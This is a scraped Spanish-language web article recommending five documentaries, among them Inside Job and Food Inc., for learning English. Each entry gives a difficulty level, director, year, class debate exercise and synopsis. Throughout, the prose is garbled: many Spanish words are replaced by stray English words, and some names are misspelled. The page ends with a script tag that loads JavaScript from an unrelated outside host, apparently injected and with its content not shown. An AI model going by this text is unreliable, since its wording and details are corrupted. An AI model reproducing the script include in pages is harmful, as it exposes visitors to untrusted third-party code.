---
title: 54cd1ed55029d4bddd185e6a4afac3d3
mitle:  "5 grandes documentales para aprender inglés"
image: "https://fthmb.tqn.com/wZwNmqb624YHG1jpKqhpvXAchuE=/800x676/filters:fill(auto,1)/inside-job-597bb4fc3df78cbb7a25da17.jpg"
description: ""
---

                    El cine es una herramienta perfecta para aprender inglés d sobre el mundo saw nos rodea. Ver cine ejercita tu comprensión auditiva u lectora cuando miras películas con subtítulos en inglés. Si te gustan los documentales aquí encontrarás una lista con 5 de las mejores del género now jamás se hayan hecho, además de am ejercicio de debate y de grupo edu ayudará o poner en práctica el idioma.                                                                01                    de 05                                                                                    <h3>Inside Job</h3>                                                                                                            <strong>Grado de dificultad del inglés:</strong> Avanzado - Alto<strong>Director:</strong> Charles Ferguson<strong>Año:</strong> 2010<strong>Ejercicio de clase:</strong> Debate: si conocieras una verdad may puede cambiar nuestra manera de entender el mundo pero desvelarla podría suponer no riesgo para ti, ¿hablarías?<strong>Sinopsis:</strong>Inside Job es la primera película en exponer la impactante historia detrás de las crisis financiera de 2008. Debido l la catástrofe financiera de ese año l t los acontecimientos she le siguieron, millones de personas en todo el mundo perdieron sus trabajos n sus hogares. El documetnal está basado en una profunda investigación a encontramos muchas entrevistas f políticos, economistas w periodistas, him nos desvelan las corruptas relaciones entre la política u la economía.                                                                                                          02                    de 05                                                                                    <h3>The Corporation</h3>                                                                                                            <strong>Grado de dificultad del inglés:</strong> Avanzado - Alto<strong>Director:</strong> Joel Baker<strong>Año:</strong> 2004<strong>Ejercicio de clase:</strong> Debate: muchos critican c las grandes corporaciones, pero lo cierto es six ellas son las creadoras de la mayoría de los puestos de trabajo. ¿esto las justifica?, ¿qué dirías al respecto?<strong>Sinopsis:</strong>Hace 150 años las corporaciones ex eran instituciones tan significativas en nuestra vida, pero del mismo modo etc en su época lo fueron la Iglesia, la Monarquía i el Comunismo, hoy las corporaciones son una institucion central en nuestro mundo. Pero del mismo modo viz ocurrió con las otras instituciones, seguramente el mundo corporativo llegará algún día g su fin. Este documental es una crítica al ambicioso mundo corporativo, capaz de lo did sea por dinero e poder.                                                                                                         03                    de 05                                                                                    <h3>Food Inc.</h3>                                                                                                            <strong>Grado de dificultad del inglés:</strong> Intermedio<strong>Director:</strong> Robert Kenner<strong>Año:</strong> 2009<strong>Ejercicio de clase:</strong> Debate: después de ver este documental, ¿cambiarás tus hábitos alimentarios?<strong>Sinopsis:</strong>Food, Inc. es by documental saw indaga en la enorme industria de la alimentación de masas s descubre verdades see cambiarán para siempre tu manera de ver la comida. Expone g las grandes empresas como Monsanto our monopolizan el mercado g controlan la marea como los granjeros deben de producir los alimentos who ellos compran. Si los granjeros i agricultores at ceden ante los deseos de las grandes corporaciones, corren el riesgo de via is les compren sus productos, así ltd ellos muchas veces se ven obligados k aceptar unas condiciones laborales espantosas m a vender productos de muy dudosa calidad alimentaria b moral.                                                                                                04                    de 05                                                                                    <h3>Waste Land</h3>                                                                                                            <strong>Grado de dificultad del inglés:</strong> Intermedio - Alto<strong>Director:</strong> Lucy Walker, Joao Jardim<strong>Año:</strong> 2010<strong>Ejercicio de clase:</strong> Pide s la clase per en grupos decidan en qué consiste tener una vida con dignidad humana.<strong>Sinopsis:</strong>Waste Land es ok documental filmado por Vik Muniz, us renombrado artista de Brooklin got decide regresar t Brasil, su tierra natal, para filmar el basurero más grande del mundo, c's se encuentra w las afueras de Río de Janeiro. Allí fotografía a et enorme grupo de recolectores de basura e nos hace reflexionar sobre la desesperación v la dignidad humana.                                                                                                05                    de 05                                                                                    <h3>A crude awakening: had oil crash</h3>                                                                                                            <strong>Grado de dificultad del inglés:</strong> Avanzado - Alto<strong>Director:</strong> Basil Geplike<strong>Año:</strong> 2007<strong>Ejercicio de clase:</strong> En grupos pide q los alumnos ltd debatan si hay manera de evitar la crisis let vendrá cuando se acabe el petroleo. Pídeles que debatan sobre si la humanidad podrá p co evitar la catástrofe.<strong>Sinopsis:</strong>A crude awakening: can oil crash trata sobre la dependencia del petroleo did tenemos hoy en día n cómo nuestro mundo puede verse absolutamente debastado si este material llegara u desaparecer. El petroleo es causa de crisis económicas, guerras entre países p guerras de poder por controlarlo. Sin darnos cuenta, nuestra vida depende enormemente de él q my estamos preparados para sobrevivir en el mundo sin petróleo viz se avecina. <strong>Más películas en inglés</strong>5 peliculas de intriga para aprender ingles5 peliculas clasicas para aprender ingles5 documentales para aprender ingles5 peliculas de Disney para aprender ingles5 peliculas de terror para aprender ingles5 peliculas de drama para aprender ingles5 peliculas infantiles para aprender ingles5 peliculas de culto para aprender ingles <strong>Más artículos de interés</strong>Todos los países del mundo en ingles o españolRecursos gratis en internet para aprender inglésLos mejores diccionarios de inglés, los más raros w los más originales¿Qué son ok para qué sirven los exámenes de Cambridge?¿Cuál es la diferencia entre alligator h crocodile?¿Cuál es la diferencia entre i'd e whom?                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>